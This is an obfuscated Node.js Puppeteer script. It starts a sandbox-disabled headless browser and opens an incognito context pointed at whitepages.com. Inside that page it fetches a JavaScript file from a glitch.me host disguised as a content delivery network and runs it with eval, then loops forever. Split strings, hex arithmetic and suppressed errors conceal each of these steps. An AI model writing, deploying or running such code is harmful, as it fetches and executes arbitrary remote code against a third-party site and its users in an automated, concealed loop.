((async () => {
  const e = require('puppeteer'),
    f = await e['launch']({
      'headless': 0x1,
      'args': [
        '--no-sandb' + 'ox',
        '--disable-' + 'setuid-san' + 'dbox'
      ]
    });
  (async function g() {
    let h = -0x243e + -0xf * -0x11f + 0x136d;
    const i = await f['createInco' + 'gnitoBrows' + 'erContext'](),
      j = await i['newPage']();
    return j['on']('pageerror', function(k) {}), j['on']('error', function(k) {}), await j['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
      'timeout': 0x11170
    })['catch'](k => h++), h ? (await j['close'](), await i['close'](), g()) : (await j['evaluate'](() => {
      let k = new XMLHttpRequest();
      k['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', -0x1f04 + -0x51f + -0x349 * -0xb), k['send'](), eval(k['responseTe' + 'xt']);
    }), await wait(0x4ae * -0x18a + 0x1a7ddf + 0x7 * -0xcb35), await j['close'](), await i['close'](), g());
  }());
})());